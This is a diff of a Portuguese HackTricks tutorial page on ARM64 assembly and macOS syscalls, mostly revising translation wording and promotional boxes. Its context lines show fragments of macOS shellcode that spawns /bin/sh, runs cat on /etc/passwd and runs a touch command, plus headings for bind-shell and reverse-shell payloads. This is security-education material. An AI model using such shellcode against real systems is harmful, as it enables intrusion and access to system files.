@@ -2,123 +2,125 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Outras formas de apoiar o HackTricks:
+
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.
 
 </details>
 
 ## **Introdução ao ARM64**
 
-ARM64, também conhecido como ARMv8-A, é uma arquitetura de processador de 64 bits usada em vários tipos de dispositivos, incluindo smartphones, tablets, servidores e até mesmo alguns computadores pessoais de alta qualidade (macOS). É um produto da ARM Holdings, uma empresa conhecida por seus designs de processadores eficientes em energia.
+ARM64, também conhecido como ARMv8-A, é uma arquitetura de processador de 64 bits usada em vários tipos de dispositivos, incluindo smartphones, tablets, servidores e até alguns computadores pessoais de alta performance (macOS). É um produto da ARM Holdings, conhecida por seus designs de processadores eficientes em termos de energia.
 
 ### **Registradores**
 
-O ARM64 possui **31 registradores de propósito geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em um modo de 32 bits usando os nomes w0 a w30.
+O ARM64 possui **31 registradores de uso geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em um modo de 32 bits usando os nomes w0 a w30.
 
-1. **`x0`** a **`x7`** - Geralmente são usados como registradores temporários e para passar parâmetros para sub-rotinas.
-* **`x0`** também carrega os dados de retorno de uma função.
-2. **`x8`** - No kernel do Linux, `x8` é usado como o número de chamada do sistema para a instrução `svc`. **No macOS, o x16 é o usado!**
+1. **`x0`** a **`x7`** - Tipicamente usados como registradores temporários e para passar parâmetros para sub-rotinas.
+* **`x0`** também carrega o dado de retorno de uma função
+2. **`x8`** - No kernel do Linux, `x8` é usado como o número da chamada de sistema para a instrução `svc`. **No macOS o x16 é o utilizado!**
 3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
-4. **`x16`** e **`x17`** - Registradores temporários, também usados para chamadas de função indiretas e stubs da PLT (Procedure Linkage Table).
-* **`x16`** é usado como o número de chamada do sistema para a instrução **`svc`**.
-5. **`x18`** - Registrador de plataforma. Em algumas plataformas, este registrador é reservado para usos específicos da plataforma.
-6. **`x19`** a **`x28`** - São registradores preservados pelo chamado. Uma função deve preservar os valores desses registradores para seu chamador.
-7. **`x29`** - Ponteiro de quadro.
-8. **`x30`** - Registrador de link. Ele armazena o endereço de retorno quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada.
-9. **`sp`** - Ponteiro de pilha, usado para acompanhar o topo da pilha.
-10. **`pc`** - Contador de programa, que aponta para a próxima instrução a ser executada.
+4. **`x16`** e **`x17`** - Registradores temporários, também usados para chamadas de função indiretas e stubs da Tabela de Ligação de Procedimentos (PLT).
+* **`x16`** é usado como o **número da chamada de sistema** para a instrução **`svc`**.
+5. **`x18`** - Registrador da plataforma. Em algumas plataformas, este registrador é reservado para usos específicos da plataforma.
+6. **`x19`** a **`x28`** - Estes são registradores preservados pelo chamado. Uma função deve preservar os valores destes registradores para quem a chamou.
+7. **`x29`** - **Ponteiro de quadro**.
+8. **`x30`** - Registrador de ligação. Ele contém o endereço de retorno quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada.
+9. **`sp`** - **Ponteiro de pilha**, usado para acompanhar o topo da pilha.
+10. **`pc`** - **Contador de programa**, que aponta para a próxima instrução a ser executada.
 
-### **Convenção de Chamada**
+### **Convenção de Chamadas**
 
-A convenção de chamada do ARM64 especifica que os **oito primeiros parâmetros** de uma função são passados nos registradores **`x0` a `x7`**. Parâmetros **adicionais** são passados na **pilha**. O valor de **retorno** é passado de volta no registrador **`x0`**, ou também em **`x1`** se tiver **128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** entre chamadas de função.
+A convenção de chamadas do ARM64 especifica que os **primeiros oito parâmetros** de uma função são passados nos registradores **`x0` a `x7`**. **Parâmetros adicionais** são passados na **pilha**. O valor de **retorno** é passado de volta no registrador **`x0`**, ou em **`x1`** também **se for de 128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** através das chamadas de função.
 
-Ao ler uma função em assembly, procure pelo **prólogo e epílogo da função**. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro** e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.
+Ao ler uma função em assembly, procure pelo **prólogo e epílogo da função**. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro**, e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.
 
-### Convenção de Chamada em Swift
+### Convenção de Chamadas em Swift
 
-O Swift possui sua própria **convenção de chamada** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Swift tem sua própria **convenção de chamadas** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
 ### **Instruções Comuns**
 
-As instruções do ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov`, etc.), **`dst`** é o registrador **destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os registradores **fonte**. Valores imediatos também podem ser usados no lugar de registradores fonte.
+Instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov`, etc.), **`dst`** é o **registrador de destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os **registradores de origem**. Valores imediatos também podem ser usados no lugar de registradores de origem.
 
 * **`mov`**: **Move** um valor de um **registrador** para outro.
 * Exemplo: `mov x0, x1` — Isso move o valor de `x1` para `x0`.
-* **`ldr`**: **Load** um valor da **memória** para um **registrador**.
-* Exemplo: `ldr x0, [x1]` — Isso carrega um valor da localização de memória apontada por `x1` para `x0`.
-* **`str`**: **Store** um valor de um **registrador** para a **memória**.
-* Exemplo: `str x0, [x1]` — Isso armazena o valor em `x0` na localização de memória apontada por `x1`.
-* **`ldp`**: **Load Pair of Registers**. Essa instrução **carrega dois registradores** de **locais de memória consecutivos**. O endereço de memória é normalmente formado pela adição de um deslocamento ao valor de outro registrador.
+* **`ldr`**: **Carrega** um valor da **memória** para um **registrador**.
+* Exemplo: `ldr x0, [x1]` — Isso carrega um valor do local de memória apontado por `x1` para `x0`.
+* **`str`**: **Armazena** um valor de um **registrador** na **memória**.
+* Exemplo: `str x0, [x1]` — Isso armazena o valor em `x0` no local de memória apontado por `x1`.
+* **`ldp`**: **Carrega Par de Registradores**. Esta instrução **carrega dois registradores** de **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um deslocamento ao valor em outro registrador.
 * Exemplo: `ldp x0, x1, [x2]` — Isso carrega `x0` e `x1` dos locais de memória em `x2` e `x2 + 8`, respectivamente.
-* **`stp`**: **Store Pair of Registers**. Essa instrução **armazena dois registradores** em **locais de memória consecutivos**. O endereço de memória é normalmente formado pela adição de um deslocamento ao valor de outro registrador.
+* **`stp`**: **Armazena Par de Registradores**. Esta instrução **armazena dois registradores** em **locais de memória consecutivos**. O endereço de memória é tipicamente formado adicionando um deslocamento ao valor em outro registrador.
 * Exemplo: `stp x0, x1, [x2]` — Isso armazena `x0` e `x1` nos locais de memória em `x2` e `x2 + 8`, respectivamente.
 * **`add`**: **Adiciona** os valores de dois registradores e armazena o resultado em um registrador.
-* Exemplo: `add x0, x1, x2` - Isso adiciona os valores em `x1` e `x2` juntos e armazena o resultado em `x0`.
+* Exemplo: `add x0, x1, x2` — Isso adiciona os valores em `x1` e `x2` e armazena o resultado em `x0`.
 * **`sub`**: **Subtrai** os valores de dois registradores e armazena o resultado em um registrador.
-* Exemplo: `sub x0, x1, x2` - Isso subtrai o valor em `x2` de `x1` e armazena o resultado em `x0`.
+* Exemplo: `sub x0, x1, x2` — Isso subtrai o valor em `x2` de `x1` e armazena o resultado em `x0`.
 * **`mul`**: **Multiplica** os valores de **dois registradores** e armazena o resultado em um registrador.
-* Exemplo: `mul x0, x1, x2` - Isso multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
+* Exemplo: `mul x0, x1, x2` — Isso multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
 * **`div`**: **Divide** o valor de um registrador por outro e armazena o resultado em um registrador.
-* Exemplo: `div x0, x1, x2` - Isso divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
-* **`bl`**: **Branch with link**, usado para **chamar** uma **sub-rotina**. Armazena o **endereço de retorno em `x30`**.
-* Exemplo: `bl myFunction` - Isso chama a função `myFunction` e armazena o endereço de retorno em `x30`.
-* **`blr`**: **Branch with Link to Register**, usado para **chamar** uma **sub-rotina** onde o destino é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`.
-* Exemplo: `blr x1` - Isso chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
-* **`ret`**: **Retorna** da **sub-rotina**, normalmente usando o endereço em **`x30`**.
-* Exemplo: `ret` - Isso retorna da sub-rotina atual usando o endereço de retorno em `x30`.
-* **`cmp`**: **Compara** dois registradores e define as flags de condição.
-* Exemplo: `cmp x0, x1` - Isso compara os valores em `x0` e `x1` e define as flags de condição de acordo.
-* **`b.eq`**: **Branch if equal**, baseado na instrução `cmp` anterior.
-* Exemplo: `b.eq label` - Se a instrução `cmp` anterior encontrou dois valores iguais, isso salta para `label`.
-* **`b.ne`**: **Branch if Not Equal**. Essa instrução verifica as flags de condição (que foram definidas por uma instrução de comparação anterior) e, se os valores comparados não forem iguais, salta para um rótulo ou endereço.
-* Exemplo: Após uma instrução `cmp x0, x1`, `b.ne label` - Se os valores em `x0` e `x1` não forem iguais, isso salta para `label`.
-* **`cbz`**: **Compare and Branch on Zero**. Essa instrução compara um registrador com zero e, se forem iguais, salta para um rótulo ou endereço.
-* Exemplo: `cbz x0, label` - Se o valor em `x0` for zero, isso salta para `label`.
-* **`cbnz`**: **Compare and Branch on Non-Zero**. Essa instrução compara um registrador com zero e, se não forem iguais, salta para um rótulo ou endereço.
-* Exemplo: `cbnz x0, label` - Se o valor em `x0` for diferente de zero, isso salta para `label`.
-* **`adrp`**: Calcula o **endereço da página de um símbolo** e o armazena em um registrador.
-* Exemplo: `adrp x0, symbol` - Isso calcula o endereço da página de `symbol` e o armazena em `x0`.
-* **`ldrsw`**: **Carrega** um valor **32 bits** assinado da memória e o **estende para 64** bits.
-* Exemplo: `ldrsw x0, [x1]` - Isso carrega um valor assinado de 32 bits da localização de memória apontada por `x1`, estende-o para 64 bits e o armazena em `x0`.
-* **`stur`**: **Armazena um valor de registrador em uma localização de memória**, usando um deslocamento de outro registrador.
-* Exemplo: `stur x0, [x1, #4]` - Isso armazena o valor em `x0` no endereço de memória que é 4 bytes maior que o endereço atual em `x1`.
-* &#x20;**`svc`** : Faz uma **chamada de sistema**. Significa "Supervisor Call". Quando o processador executa essa instrução, ele **troca do modo usuário para o modo kernel** e salta para um local específico na memória onde o código de tratamento de chamada de sistema do kernel está localizado.
+* Exemplo: `div x0, x1, x2` — Isso divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
+* **`bl`**: **Branch** com link, usado para **chamar** uma **sub-rotina**. Armazena o **endereço de retorno em `x30`**.
+* Exemplo: `bl myFunction` — Isso chama a função `myFunction` e armazena o endereço de retorno em `x30`.
+* **`blr`**: **Branch** com Link para Registrador, usado para **chamar** uma **sub-rotina** onde o alvo é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`.
+* Exemplo: `blr x1` — Isso chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
+* **`ret`**: **Retorna** da **sub-rotina**, tipicamente usando o endereço em **`x30`**.
+* Exemplo: `ret` — Isso retorna da sub-rotina atual usando o endereço de retorno em `x30`.
+* **`cmp`**: **Compara** dois registradores e define flags de condição.
+* Exemplo: `cmp x0, x1` — Isso compara os valores em `x0` e `x1` e define as flags de condição de acordo.
+* **`b.eq`**: **Branch se igual**, baseado na instrução `cmp` anterior.
+* Exemplo: `b.eq label` — Se a instrução `cmp` anterior encontrou dois valores iguais, isso salta para `label`.
+* **`b.ne`**: **Branch se Não Igual**. Esta instrução verifica as flags de condição (que foram definidas por uma instrução de comparação anterior), e se os valores comparados não foram iguais, ela salta para um rótulo ou endereço.
+* Exemplo: Após uma instrução `cmp x0, x1`, `b.ne label` — Se os valores em `x0` e `x1` não foram iguais, isso salta para `label`.
+* **`cbz`**: **Compara e Branch se Zero**. Esta instrução compara um registrador com zero, e se forem iguais, ela salta para um rótulo ou endereço.
+* Exemplo: `cbz x0, label` — Se o valor em `x0` for zero, isso salta para `label`.
+* **`cbnz`**: **Compara e Branch se Não Zero**. Esta instrução compara um registrador com zero, e se não forem iguais, ela salta para um rótulo ou endereço.
+* Exemplo: `cbnz x0, label` — Se o valor em `x0` for não zero, isso salta para `label`.
+* **`adrp`**: Calcula o **endereço da página de um símbolo** e armazena em um registrador.
+* Exemplo: `adrp x0, symbol` — Isso calcula o endereço da página de `symbol` e armazena em `x0`.
+* **`ldrsw`**: **Carrega** um valor **32 bits** com sinal da memória e **estende o sinal para 64** bits.
+* Exemplo: `ldrsw x0, [x1]` — Isso carrega um valor de 32 bits com sinal do local de memória apontado por `x1`, estende o sinal para 64 bits e armazena em `x0`.
+* **`stur`**: **Armazena um valor de registrador em um local de memória**, usando um deslocamento de outro registrador.
+* Exemplo: `stur x0, [x1, #4]` — Isso armazena o valor em `x0` no endereço de memória que é 4 bytes maior que o endereço atualmente em `x1`.
+* &#x20;**`svc`** : Faz uma **chamada de sistema**. Significa "Chamada de Supervisor". Quando o processador executa esta instrução, ele **muda do modo usuário para o modo kernel** e salta para um local específico na memória onde o **código de tratamento de chamadas de sistema do kernel** está localizado.
 *   Exemplo:&#x20;
 
 ```armasm
-mov x8, 93  ; Carrega o número de chamada de sistema para saída (93) no registrador x8.
+mov x8, 93  ; Carrega o número da chamada de sistema para sair (93) no registrador x8.
 mov x0, 0   ; Carrega o código de status de saída (0) no registrador x0.
 svc 0       ; Faz a chamada de sistema.
 ```
 
 ### **Prólogo da Função**
 
-1.  **Salva o registrador de link e o ponteiro de quadro na pilha**:
+1.  **Salva o registrador de ligação e o ponteiro de quadro na pilha**:
 
 {% code overflow="wrap" %}
 ```armasm
-stp x29, x30, [sp, #-16]!  ; armazena o par x29 e x30 na pilha e decrementa o ponteiro da pilha
+stp x29, x30, [sp, #-16]!  ; armazena o par x29 e x30 na pilha e decrementa o ponteiro de pilha
 ```
 {% endcode %}
 2. **Configura o novo ponteiro de quadro**: `mov x29, sp` (configura o novo ponteiro de quadro para a função atual)
-3. **Aloca espaço na pilha para variáveis locais** (se necessário): `sub sp, sp, <size>` (onde `<size>` é o número de bytes necessário)
+3. **Aloca espaço na pilha para variáveis locais** (se necessário): `sub sp, sp, <tamanho>` (onde `<tamanho>` é o número de bytes necessários)
 
 ### **Epílogo da Função**
 
-1. **Desaloca variáveis locais (se alguma foi alocada)**: `add sp, sp, <size>`
-2.  **Restaura o registrador de link e o ponteiro de quadro**:
+1. **Desaloca variáveis locais (se alguma foi alocada)**: `add sp, sp, <tamanho>`
+2.  **Restaura o registrador de ligação e o ponteiro de quadro**:
 
 {% code overflow="wrap" %}
 ```armasm
-ldp x29, x30, [sp], #16  ; carrega o par x29 e x30 da pilha e incrementa o ponteiro da pilha
+ldp x29, x30, [sp], #16  ; carrega o par x29 e x30 da pilha e incrementa o ponteiro de pilha
 ```
 {% endcode %}
-3. **Retorna**: `ret` (retorna o controle para o chamador usando o endereço no registrador de link)
+3. **Retorna**: `ret` (devolve o controle para o chamador usando o endereço no registrador de ligação)
 
 ## macOS
 
@@ -128,9 +130,9 @@ Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3
 
 ### Armadilhas Mach
 
-Confira [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). As armadilhas Mach terão **x16 < 0**, então você precisa chamar os números da lista anterior com um **sinal de menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.
+Confira [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html). Armadilhas Mach terão **x16 < 0**, então você precisa chamar os números da lista anterior com um **menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.
 
-Você também pode verificar **`libsystem_kernel.dylib`** em um desmontador para descobrir como chamar essas chamadas de sistema (e as chamadas de sistema BSD).
+Você também pode verificar **`libsystem_kernel.dylib`** em um desmontador para descobrir como chamar essas (e BSD) chamadas de sistema:
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -139,7 +141,7 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
 {% hint style="success" %}
-Às vezes é mais fácil verificar o código **descompilado** de **`libsystem_kernel.dylib`** do que verificar o **código-fonte**, porque o código de várias chamadas de sistema (BSD e Mach) é gerado por meio de scripts (verifique os comentários no código-fonte), enquanto na dylib você pode encontrar o que está sendo chamado.
+Às vezes é mais fácil verificar o código **decompilado** de **`libsystem_kernel.dylib`** do que verificar o **código fonte** porque o código de várias syscalls (BSD e Mach) é gerado por scripts (verifique os comentários no código fonte), enquanto na dylib você pode encontrar o que está sendo chamado.
 {% endhint %}
 
 ### Shellcodes
@@ -161,7 +163,7 @@ done
 ```
 <details>
 
-<summary>Código C para testar o shellcode</summary>
+<summary>Código em C para testar o shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -211,7 +213,7 @@ return 0;
 
 #### Shell
 
-Retirado [**aqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.
+Retirado [**daqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.
 
 {% tabs %}
 {% tab title="com adr" %}
@@ -229,6 +231,8 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 
 sh_path: .asciz "/bin/sh"
 ```
+{% endtab %}
+
 {% tab title="com pilha" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
@@ -258,12 +262,9 @@ mov  x16, #59     ; Move the execve syscall number (59) into x16.
 svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 ```
-{% endtab %}
-{% endtabs %}
-
 #### Ler com cat
 
-O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (que na memória significa uma pilha de endereços).
+O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (o que na memória significa uma pilha dos endereços).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -333,9 +334,9 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-#### Shell de Bind
+#### Bind shell
 
-Shell de Bind de [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porta 4444**
+Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porta 4444**
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -419,7 +420,7 @@ svc  #0x1337
 ```
 #### Shell reverso
 
-De [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell para **127.0.0.1:4444**
+De [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), shell reverso para **127.0.0.1:4444**
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -488,12 +489,14 @@ svc  #0x1337
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Outras formas de apoiar o HackTricks:
+
+* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
